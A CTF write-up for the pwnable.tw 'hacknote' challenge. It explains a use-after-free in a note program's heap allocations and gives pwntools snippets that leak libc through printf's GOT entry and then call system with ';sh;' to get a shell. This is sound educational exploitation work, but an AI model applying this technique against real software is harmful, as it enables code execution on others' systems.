+++
title = 'pwnable.tw Hacknote'
date = 2025-02-13T17:20:36+08:00
draft = false
categories = ["CTF Writeup"]
series = ["pwnable.tw"]
tags = ["pwn", "heap", "use-after-free"]
+++

This challenge involves exploiting Use-After-Free vulnerability. The note structure in this challenge stores `puts` function pointer besides the note content pointer. By properly allocating and free-ing memory, full control on EIP will be achieved. 

# Initial Analysis

The challenge provide 2 files, hacknote (the challenge binary) and libc_32.so.6 (the libc used in this challenge)
## File Analysis

```bash
file hacknote 
hacknote: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter ./ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=a32de99816727a2ffa1fe5f4a324238b2d59a606, stripped
```

```bash
file libc_32.so.6 
libc_32.so.6: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=d26149b8dc15c0c3ea8a5316583757f69b39e037, for GNU/Linux 2.6.32, stripped
```

Security Mitigations:

```python
checksec --file ./hacknote 
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8047000)
    RUNPATH:    b'.'
```

## Key Findings

- The challenge file has no PIE, the address stays the same
- The challenge file was stripped, reversing and debugging will be hard

# Initial Interactions

The program basically has 3 features.
1. Add note
2. Delete note
3. Print note

![image2.png](/images/pwnabletw-hacknote/image2.png)

The add note feature has overflow mitigation, the user only allowed to put in content as much as given size.

![image1.png](/images/pwnabletw-hacknote/image1.png)

# Reversing

*note* the functions and variables name was already changed beforehand to make this writeup smaller

## Main function

![image3.png](/images/pwnabletw-hacknote/image3.png)

not much interesting on the main function, it basically read 4 input and function `atoi` converts the input into integer. Then the program will check which function to call.

## Add Note function

![image4.png](/images/pwnabletw-hacknote/image4.png)

To summarise:
1. The function will check if the number of notes added is < 6
2. malloc(8), first 4 bytes for `puts` function and next 4 bytes for the note content
3. malloc(size), this allocated space is for the note's content

From this function, the note structure will be as below:

```C
struct Note {
	puts_function_pointer;
	note_content_pointer;
}
```
To visualize:
![image5.png](/images/pwnabletw-hacknote/image5.png)

In GDB:

![image7.png](/images/pwnabletw-hacknote/image7.png)

![image6.png](/images/pwnabletw-hacknote/image6.png)

## Delete Note Function

![image8.png](/images/pwnabletw-hacknote/image8.png)

To summarize:
1. The note content space will be freed
2. The first 8 bytes which contains puts_function pointer and notes_content pointer also freed

## Print Note Function

![image9.png](/images/pwnabletw-hacknote/image9.png)

To summarize:
1. The function will take the address of puts_function in note object and call it.
2. After the free, the space are not zero'ed out, and it can still be printed. 

## Attack Stratergy

1. The note index tracker are not reset after a note being deleted.
2. The deleted note still can be printed.
3. Use After Free vulnerability can be weaponize
4. Control EIP by using free'ed puts_function space via UAF

### Vulnerability Testing

```bash
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :1
Note size :16
Content :AAAA
Success !
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :1
Note size :16
Content :BBBB
Success !
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :2
Index :1
Success
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :2
Index :0
Success
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :1
Note size :8
Content :ZZZZ
Success !
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :3
Index :1
Segmentation fault (core dumped)
```

```bash
[ 4406.847536] hacknote[4515]: segfault at 5a5a5a5a ip 000000005a5a5a5a sp 00000000ff8b1aec error 14 in libc_32.so.6[ea387000+1ad000] likely on CPU 0 (core 0, socket 0)
```

Got control on the EIP.

### Explanation

To explain this I will be using GDB and a bit of drawing

- Add note with size 16 and content AAAA
- Add another note with size 16 and content BBBB
![image10.png](/images/pwnabletw-hacknote/image10.png)

Next

- Free note 1
- Free note 0

![image11.png](/images/pwnabletw-hacknote/image11.png)

As of now, there are 4 available fastbins

```python
0x10: 0x804b000 —▸ 0x804b028 ◂— 0 
0x18: 0x804b010 —▸ 0x804b038 ◂— 0
```
2 size 16 fastbins and 2 size 24

The size 16 fastbins came from malloc(8) which are the puts_function + note_content space

The size 24 fastbins came from the malloc(16) which are the contents for notes 0 and 1

Next add a note with size 8.

![image12.png](/images/pwnabletw-hacknote/image12.png)

The new allocated space for new note content uses `note 1`'s puts_function + note_content space. This causes the print note function to `note 1` results in calling `ZZZZ`.

![image13.png](/images/pwnabletw-hacknote/image13.png)

# Exploitation Phase

## Leaking Libc Base Address

Now that calling the Print Note function will basically call `puts` and the address after it will be the argument, we can make the program print out Libc addresses.

From previous section, we can weaponize the technique and put in `puts_function` address and any libc function GOT as argument.

```python
# allocate 1 note with size 8, now the puts pointer for note 1 will be allocated for our content
puts_function = 0x0804862b
addnote(b'8', p32(0x0804862b) + p32(elf.got['printf']))

# print the leaked libc

printnote(b'1')
leak = unpack(io.recv(4))
info(f'Leaked: {hex(leak)}')
libc.address = leak - libc.sym['printf']
info(f'Libc Base: {hex(libc.address)}')
system = libc.sym['system']
info(f'System: {hex(system)}')
```

![image14.png](/images/pwnabletw-hacknote/image14.png)
## Calling System

After obtaining the libc base address, now we can give the system address for `print note` function to call and set `sh` string as argument.

```python
delnote(b'2')
addnote(b'8', p32(system)+b';sh;')
printnote(b'1')
```

![image15.png](/images/pwnabletw-hacknote/image15.png)

Now we managed to solve the challenge! Thanks for reading.
